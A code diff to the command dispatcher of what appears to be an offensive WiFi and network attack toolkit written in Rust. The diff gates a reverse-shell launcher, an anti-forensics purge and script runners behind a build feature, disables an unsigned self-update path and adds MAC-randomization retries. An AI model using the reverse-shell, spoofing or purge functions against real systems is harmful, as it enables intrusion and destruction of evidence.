@@ -1,11 +1,9 @@
 use std::{
     collections::{HashMap, VecDeque},
-    env,
     fs::{self, File},
     io::Write,
     net::{Ipv4Addr, SocketAddr, ToSocketAddrs},
     path::{Path, PathBuf},
-    process::Command,
     sync::{Mutex as StdMutex, OnceLock},
     time::{Duration, SystemTime, UNIX_EPOCH},
 };
@@ -45,8 +43,9 @@ use crate::cli::{
     LootKind, LootListArgs, LootReadArgs,
     MitmCommand, MitmStartArgs, NotifyCommand, ProcessCommand, ProcessKillArgs, ProcessStatusArgs,
     ReverseCommand, ReverseLaunchArgs, ScanCommand, ScanDiscovery, ScanRunArgs,
-    StatusCommand, SystemCommand, SystemFdeMigrateArgs, SystemFdePrepareArgs, SystemUpdateArgs,
-    ExportLogsToUsbArgs, UsbMountArgs, UsbMountMode, UsbUnmountArgs, WifiBestArgs, WifiCommand,
+    StatusCommand, SystemCommand, SystemConfigureHostArgs, SystemFdeMigrateArgs,
+    SystemFdePrepareArgs, SystemUpdateArgs, ExportLogsToUsbArgs, UsbMountArgs, UsbMountMode,
+    UsbUnmountArgs, WifiBestArgs, WifiCommand,
     WifiCrackArgs,
     WifiDeauthArgs, WifiDisconnectArgs, WifiEvilTwinArgs, WifiKarmaArgs, WifiMacRandomizeArgs,
     WifiMacRestoreArgs, WifiMacSetArgs, WifiMacSetVendorArgs, WifiPmkidArgs, WifiProbeSniffArgs,
@@ -59,21 +58,20 @@ use crate::cli::{
 };
 #[cfg(target_os = "linux")]
 use crate::netlink_helpers::netlink_set_interface_up;
-use crate::anti_forensics::perform_complete_purge;
 use crate::cancel::{cancel_sleep, check_cancel, CancelFlag, CancelledError};
 use crate::mount::{MountMode, MountPolicy, MountRequest, UnmountRequest};
 use crate::system::{
     active_uplink, acquire_dhcp_lease, append_payload_log, apply_interface_isolation_strict,
-    arp_spoof_running, backup_repository, backup_routing_state, build_scan_loot_path,
+    arp_spoof_running, backup_routing_state, build_scan_loot_path,
     build_manual_embed, build_mitm_pcap_path, cached_gateway, compose_status_text,
     connect_wifi_network, default_gateway_ip, delete_wifi_profile, detect_ethernet_interface,
     detect_interface, disconnect_wifi_interface, dns_spoof_running, enable_ip_forwarding,
-    enforce_single_interface, find_interface_by_mac, git_reset_to_remote, interface_gateway,
+    enforce_single_interface, find_interface_by_mac, interface_gateway,
     kill_process, last_dhcp_outcome, lease_record, list_interface_summaries, list_wifi_profiles,
     load_wifi_profile, log_mac_usage, pcap_capture_running, ping_host, preferred_interface,
     process_running_exact, randomize_hostname, read_default_route, read_discord_webhook,
     read_dns_servers, read_interface_preference, read_interface_preference_with_mac,
-    read_interface_stats, read_wifi_link_info, restart_system_service, restore_routing_state,
+    read_interface_stats, read_wifi_link_info, restore_routing_state,
     sanitize_label, save_wifi_profile, scan_local_hosts, scan_local_hosts_cancellable,
     scan_wifi_networks, scan_wifi_networks_with_timeout_cancel, select_active_uplink,
     select_best_interface, select_wifi_interface, send_discord_payload, send_scan_to_discord,
@@ -259,6 +257,9 @@ pub fn dispatch_command_with_cancel(
         Commands::Reverse(ReverseCommand::Launch(args)) => handle_reverse_launch(root, args),
         Commands::System(SystemCommand::Update(args)) => handle_system_update(root, args),
         Commands::System(SystemCommand::RandomizeHostname) => handle_randomize_hostname(),
+        Commands::System(SystemCommand::ConfigureHost(args)) => {
+            handle_system_configure_host(args)
+        }
         Commands::System(SystemCommand::FdePrepare(args)) => handle_system_fde_prepare(root, args),
         Commands::System(SystemCommand::FdeMigrate(args)) => handle_system_fde_migrate(root, args),
         Commands::System(SystemCommand::Reboot) => handle_system_reboot(),
@@ -2795,6 +2796,7 @@ fn handle_network_status() -> Result<HandlerResult> {
     Ok(("Network health collected".to_string(), Value::Object(data)))
 }
 
+#[cfg(feature = "external_tools")]
 fn handle_reverse_launch(root: &Path, args: ReverseLaunchArgs) -> Result<HandlerResult> {
     let ReverseLaunchArgs {
         target,
@@ -2827,6 +2829,12 @@ fn handle_reverse_launch(root: &Path, args: ReverseLaunchArgs) -> Result<Handler
     Ok(("Reverse shell launched".to_string(), data))
 }
 
+#[cfg(not(feature = "external_tools"))]
+fn handle_reverse_launch(_root: &Path, _args: ReverseLaunchArgs) -> Result<HandlerResult> {
+    bail!("reverse shell disabled (external_tools)")
+}
+
+#[cfg(feature = "external_tools")]
 fn spawn_reverse_shell(
     target: &str,
     port: u16,
@@ -2839,13 +2847,9 @@ fn spawn_reverse_shell(
     stream.set_nodelay(true).ok();
 
     let (program, args) = parse_shell_command(shell)?;
-    let mut child = Command::new(program)
-        .args(args)
-        .stdin(std::process::Stdio::piped())
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()
-        .context("spawning shell process")?;
+    let arg_refs: Vec<&str> = args.iter().map(|arg| arg.as_str()).collect();
+    let mut child =
+        crate::external_tools::system_shell::spawn_piped(&program, &arg_refs)?;
 
     let pid = child.id();
     let mut child_stdin = child.stdin.take().context("opening shell stdin")?;
@@ -2873,6 +2877,16 @@ fn spawn_reverse_shell(
     });
 
     Ok(pid)
+}
+
+#[cfg(not(feature = "external_tools"))]
+fn spawn_reverse_shell(
+    _target: &str,
+    _port: u16,
+    _shell: &str,
+    _source_ip: Ipv4Addr,
+) -> Result<u32> {
+    bail!("reverse shell disabled (external_tools)")
 }
 
 fn resolve_target_ipv4(target: &str, port: u16) -> Result<SocketAddr> {
@@ -3030,8 +3044,8 @@ fn ensure_route_health_check() -> Result<()> {
     if let Err(e) = resolv {
         if e.kind() == std::io::ErrorKind::PermissionDenied {
             bail!(
-                "/etc/resolv.conf is not writable (possible immutable bit or permissions). \
-                 Remove chattr +i or adjust permissions before running ensure-route."
+                "/etc/resolv.conf is not writable (possible immutable bit or systemd sandbox). \
+                 Remove chattr +i or add ReadWritePaths=/etc/resolv.conf in rustyjackd.service."
             );
         } else {
             bail!("Failed to open /etc/resolv.conf for write: {}", e);
@@ -3211,49 +3225,12 @@ pub fn run_system_update_with_progress<F>(
 where
     F: FnMut(f32, &str),
 {
-    if env::var("RUSTYJACK_ALLOW_UNSAFE_UPDATES")
-        .ok()
-        .as_deref()
-        != Some("1")
-    {
-        bail!("System updates are disabled until the signed Rust-only update pipeline is implemented. Set RUSTYJACK_ALLOW_UNSAFE_UPDATES=1 to override.");
-    }
-    check_cancel(cancel)?;
-    on_progress(0.1, "Creating backup...");
-    let backup = backup_repository(root, args.backup_dir.as_deref())?;
-
-    check_cancel(cancel)?;
-    on_progress(0.3, "Fetching updates...");
-    git_reset_to_remote(root, &args.remote, &args.branch)?;
-
-    check_cancel(cancel)?;
-    on_progress(0.5, "Compiling binary...");
-    // We assume cargo is available in the path
-    let status = std::process::Command::new("cargo")
-        .arg("build")
-        .arg("--release")
-        .current_dir(root)
-        .status()
-        .context("executing cargo build --release")?;
-
-    if !status.success() {
-        bail!("Compilation failed with status {}", status);
-    }
-
-    check_cancel(cancel)?;
-    on_progress(0.9, "Restarting service...");
-    restart_system_service(&args.service)?;
-
-    let data = json!({
-        "backup_path": backup,
-        "service": args.service,
-        "remote": args.remote,
-        "branch": args.branch,
-    });
-    Ok((
-        "Repository updated, compiled, and service restarted".to_string(),
-        data,
-    ))
+    let _ = (root, args, cancel);
+    on_progress(
+        0.0,
+        "System updates must be applied via the signed updater pipeline",
+    );
+    bail!("System updates must be applied via the signed updater pipeline");
 }
 
 fn handle_randomize_hostname() -> Result<HandlerResult> {
@@ -3270,6 +3247,36 @@ fn handle_randomize_hostname() -> Result<HandlerResult> {
     }
 }
 
+fn handle_system_configure_host(args: SystemConfigureHostArgs) -> Result<HandlerResult> {
+    let outcome = crate::system::setup::configure_host(args.country.as_deref())
+        .context("configuring host settings")?;
+
+    let message = if outcome.regdom.fallback_used {
+        format!(
+            "Configured regulatory domain: {} (fallback)",
+            outcome.regdom.country
+        )
+    } else {
+        format!("Configured regulatory domain: {}", outcome.regdom.country)
+    };
+
+    let data = json!({
+        "country": outcome.regdom.country,
+        "source": outcome.regdom.source,
+        "fallback_used": outcome.regdom.fallback_used,
+        "cfg80211_path": outcome.regdom.cfg80211_path,
+        "cmdline_checked": outcome.regdom.cmdline_checked,
+        "cmdline_updated": outcome.regdom.cmdline_updated,
+        "cmdline_missing": outcome.regdom.cmdline_missing,
+        "sysctl_config_path": outcome.sysctl.config_path,
+        "sysctl_runtime_applied": outcome.sysctl.runtime_applied,
+        "sysctl_runtime_errors": outcome.sysctl.runtime_errors,
+    });
+
+    Ok((message, data))
+}
+
+#[cfg(feature = "external_tools")]
 fn handle_system_fde_prepare(root: &Path, args: SystemFdePrepareArgs) -> Result<HandlerResult> {
     let SystemFdePrepareArgs { device } = args;
     if !device.starts_with("/dev/") {
@@ -3280,12 +3287,14 @@ fn handle_system_fde_prepare(root: &Path, args: SystemFdePrepareArgs) -> Result<
     if !script.exists() {
         bail!("FDE prep script missing at {}", script.display());
     }
-
-    let output = Command::new("bash")
-        .arg(&script)
-        .arg(&device)
-        .output()
-        .with_context(|| format!("running {}", script.display()))?;
+    let script_str = script
+        .to_str()
+        .ok_or_else(|| anyhow!("FDE prep script path must be valid UTF-8"))?;
+    let output = crate::external_tools::system_shell::run_allow_failure(
+        "bash",
+        &[script_str, device.as_str()],
+    )
+    .with_context(|| format!("running {}", script.display()))?;
 
     let stdout = String::from_utf8_lossy(&output.stdout).to_string();
     let stderr = String::from_utf8_lossy(&output.stderr).to_string();
@@ -3307,6 +3316,12 @@ fn handle_system_fde_prepare(root: &Path, args: SystemFdePrepareArgs) -> Result<
     Ok(("FDE USB prepared".to_string(), data))
 }
 
+#[cfg(not(feature = "external_tools"))]
+fn handle_system_fde_prepare(_root: &Path, _args: SystemFdePrepareArgs) -> Result<HandlerResult> {
+    bail!("FDE prepare disabled (external_tools)")
+}
+
+#[cfg(feature = "external_tools")]
 fn handle_system_fde_migrate(root: &Path, args: SystemFdeMigrateArgs) -> Result<HandlerResult> {
     let SystemFdeMigrateArgs {
         target,
@@ -3324,20 +3339,23 @@ fn handle_system_fde_migrate(root: &Path, args: SystemFdeMigrateArgs) -> Result<
     if !script.exists() {
         bail!("FDE migrate script missing at {}", script.display());
     }
-
-    let mut cmd = Command::new("bash");
-    cmd.arg(&script)
-        .arg("--target")
-        .arg(&target)
-        .arg("--keyfile")
-        .arg(&keyfile);
+    let script_str = script
+        .to_str()
+        .ok_or_else(|| anyhow!("FDE migrate script path must be valid UTF-8"))?;
+    let mut args = vec![
+        script_str.to_string(),
+        "--target".to_string(),
+        target.clone(),
+        "--keyfile".to_string(),
+        keyfile.clone(),
+    ];
     if execute {
-        cmd.arg("--execute");
+        args.push("--execute".to_string());
     }
-
-    let output = cmd
-        .output()
-        .with_context(|| format!("running {}", script.display()))?;
+    let arg_refs: Vec<&str> = args.iter().map(|arg| arg.as_str()).collect();
+    let output =
+        crate::external_tools::system_shell::run_allow_failure("bash", &arg_refs)
+            .with_context(|| format!("running {}", script.display()))?;
 
     let stdout = String::from_utf8_lossy(&output.stdout).to_string();
     let stderr = String::from_utf8_lossy(&output.stderr).to_string();
@@ -3366,6 +3384,11 @@ fn handle_system_fde_migrate(root: &Path, args: SystemFdeMigrateArgs) -> Result<
         },
         data,
     ))
+}
+
+#[cfg(not(feature = "external_tools"))]
+fn handle_system_fde_migrate(_root: &Path, _args: SystemFdeMigrateArgs) -> Result<HandlerResult> {
+    bail!("FDE migrate disabled (external_tools)")
 }
 
 pub(crate) fn handle_system_reboot() -> Result<HandlerResult> {
@@ -3428,8 +3451,9 @@ fn system_reboot_cmd(cmd: libc::c_int) -> Result<()> {
     bail!("Reboot syscall failed: {}", err);
 }
 
+#[cfg(feature = "external_tools")]
 fn handle_system_purge(root: &Path) -> Result<HandlerResult> {
-    let report = perform_complete_purge(root);
+    let report = crate::external_tools::anti_forensics::perform_complete_purge(root);
     let data = json!({
         "removed": report.removed,
         "service_disabled": report.service_disabled,
@@ -3438,17 +3462,29 @@ fn handle_system_purge(root: &Path) -> Result<HandlerResult> {
     Ok(("Purge completed".to_string(), data))
 }
 
+#[cfg(not(feature = "external_tools"))]
+fn handle_system_purge(_root: &Path) -> Result<HandlerResult> {
+    bail!("Purge disabled (external_tools)")
+}
+
+#[cfg(feature = "external_tools")]
 fn handle_system_install_wifi_drivers(root: &Path) -> Result<HandlerResult> {
     let script = root.join("scripts").join("wifi_driver_installer.sh");
     if !script.exists() {
         bail!("Installer script missing at {}", script.display());
     }
-
-    let output = Command::new("bash")
-        .arg(&script)
-        .env("RUSTYJACK_ROOT", root)
-        .output()
-        .with_context(|| format!("running {}", script.display()))?;
+    let script_str = script
+        .to_str()
+        .ok_or_else(|| anyhow!("Installer script path must be valid UTF-8"))?;
+    let root_str = root
+        .to_str()
+        .ok_or_else(|| anyhow!("Root path must be valid UTF-8"))?;
+    let output = crate::external_tools::system_shell::run_with_env_allow_failure(
+        "bash",
+        &[script_str],
+        &[("RUSTYJACK_ROOT", root_str)],
+    )
+    .with_context(|| format!("running {}", script.display()))?;
 
     let stdout = String::from_utf8_lossy(&output.stdout).to_string();
     let stderr = String::from_utf8_lossy(&output.stderr).to_string();
@@ -3473,6 +3509,11 @@ fn handle_system_install_wifi_drivers(root: &Path) -> Result<HandlerResult> {
     };
 
     Ok((message.to_string(), data))
+}
+
+#[cfg(not(feature = "external_tools"))]
+fn handle_system_install_wifi_drivers(_root: &Path) -> Result<HandlerResult> {
+    bail!("WiFi driver install disabled (external_tools)")
 }
 
 fn handle_system_usb_mount(root: &Path, args: UsbMountArgs) -> Result<HandlerResult> {
@@ -3829,12 +3870,46 @@ fn handle_wifi_mac_randomize(args: WifiMacRandomizeArgs) -> Result<HandlerResult
     #[cfg(target_os = "linux")]
     {
         let interface = args.interface;
+        let mut hotspot_stopped = false;
+        if let Some(state) = status_hotspot() {
+            if state.ap_interface == interface {
+                stop_hotspot().context("stopping hotspot before MAC change")?;
+                hotspot_stopped = true;
+            }
+        }
+
+        let mut wifi_disconnected = false;
+        let mut disconnect_error = None;
+        if read_wifi_link_info(&interface).connected {
+            match disconnect_wifi_interface(Some(interface.clone())) {
+                Ok(_) => wifi_disconnected = true,
+                Err(e) => disconnect_error = Some(e.to_string()),
+            }
+        }
+
         let (new_mac, vendor_reused) = generate_vendor_aware_mac(&interface)?;
         let mut manager = MacManager::new().context("creating MacManager")?;
         manager.set_auto_restore(false);
-        let state = manager
-            .set_mac(&interface, &new_mac)
-            .context("setting randomized MAC")?;
+        let mut state = None;
+        let mut retry_used = false;
+        for attempt in 0..2 {
+            match manager.set_mac(&interface, &new_mac) {
+                Ok(val) => {
+                    state = Some(val);
+                    break;
+                }
+                Err(err) => {
+                    let err_str = err.to_string();
+                    if attempt == 0 && mac_error_looks_busy(&err_str) {
+                        retry_used = true;
+                        std::thread::sleep(Duration::from_millis(300));
+                        continue;
+                    }
+                    return Err(err).context("setting randomized MAC");
+                }
+            }
+        }
+        let state = state.ok_or_else(|| anyhow!("MAC randomization failed"))?;
         let reconnect_ok = renew_dhcp_and_reconnect(&interface);
         let data = json!({
             "interface": interface,
@@ -3842,9 +3917,18 @@ fn handle_wifi_mac_randomize(args: WifiMacRandomizeArgs) -> Result<HandlerResult
             "new_mac": state.current_mac.to_string(),
             "vendor_reused": vendor_reused,
             "reconnect_ok": reconnect_ok,
+            "hotspot_stopped": hotspot_stopped,
+            "wifi_disconnected": wifi_disconnected,
+            "disconnect_error": disconnect_error,
+            "retry_used": retry_used,
         });
         Ok(("MAC randomized".to_string(), data))
     }
+}
+
+fn mac_error_looks_busy(err: &str) -> bool {
+    let lower = err.to_lowercase();
+    lower.contains("busy") || lower.contains("resource busy") || lower.contains("ebusy")
 }
 
 fn handle_wifi_mac_set_vendor(args: WifiMacSetVendorArgs) -> Result<HandlerResult> {
